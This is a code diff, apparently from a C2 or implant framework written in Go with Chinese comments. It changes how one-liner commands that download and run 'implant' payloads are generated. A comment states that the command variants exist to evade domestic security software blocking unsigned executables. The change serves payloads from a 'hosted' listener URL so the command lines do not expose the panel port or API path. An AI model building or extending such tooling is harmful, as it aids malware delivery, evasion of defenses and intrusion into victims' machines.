@@ -127,7 +127,7 @@ func (s *Server) resolveDownloadTarget(r *http.Request, serverURL, override stri
 //     直接执行的格式也会给出，用于规避国产安全软件对「未签名新 PE 落地执行」的拦截。
 //
 // 第一个变体仍是主推方案，兼容字段 OneLiner 取它，响应结构不变。
-func (s *Server) oneLinerSet(r *http.Request, serverURL, osName, format, buildID, override string) *OneLinerSet {
+func (s *Server) oneLinerSet(r *http.Request, serverURL, osName, format, buildID, override, dlOverride string) *OneLinerSet {
 	osName = strings.ToLower(strings.TrimSpace(osName))
 	if osName == "" {
 		osName = "windows"
@@ -140,7 +140,12 @@ func (s *Server) oneLinerSet(r *http.Request, serverURL, osName, format, buildID
 	}
 
 	target := s.resolveDownloadTarget(r, serverURL, override)
-	dlURL := fmt.Sprintf("%s/api/v1/implant/payload/%s", target.Base, url.PathEscape(buildID))
+	// v1.4.3 #15b-B：优先用「载荷托管」的监听器端口地址（形如 /s/<token>/<name>），
+	// 这样命令行里不会出现面板端口与 /api/v1 接口路径；未启用托管时回退到面板地址。
+	dlURL := strings.TrimSpace(dlOverride)
+	if dlURL == "" {
+		dlURL = fmt.Sprintf("%s/api/v1/implant/payload/%s", target.Base, url.PathEscape(buildID))
+	}
 
 	var variants []OneLiner
 	if direct {
@@ -576,6 +581,7 @@ func (s *Server) storedImplantOneLinerHandler(w http.ResponseWriter, r *http.Req
 
 	id := mux.Vars(r)["id"]
 	osName, format := "windows", ""
+	var impForURL *database.StoredImplant
 
 	if strings.HasPrefix(id, "file:") {
 		// 输出目录里没有数据库记录的遗留文件：按扩展名推断平台与格式。
@@ -587,10 +593,17 @@ func (s *Server) storedImplantOneLinerHandler(w http.ResponseWriter, r *http.Req
 	} else if db := database.Get(); db != nil {
 		if imp, err := db.GetImplant(id); err == nil {
 			osName, format = imp.OS, imp.Format
+			impForURL = imp
 		}
 	}
 
-	set := s.oneLinerSet(r, "", osName, format, id, "")
+	// v1.4.3 #15b-B：列表页重新生成命令时也用托管地址（URL 同样不含面板入口）
+	hosted := ""
+	if impForURL != nil {
+		hosted = s.hostedPayloadURL(r, impForURL)
+	}
+
+	set := s.oneLinerSet(r, "", osName, format, id, "", hosted)
 	if set == nil {
 		w.WriteHeader(http.StatusOK)
 		_ = json.NewEncoder(w).Encode(map[string]interface{}{
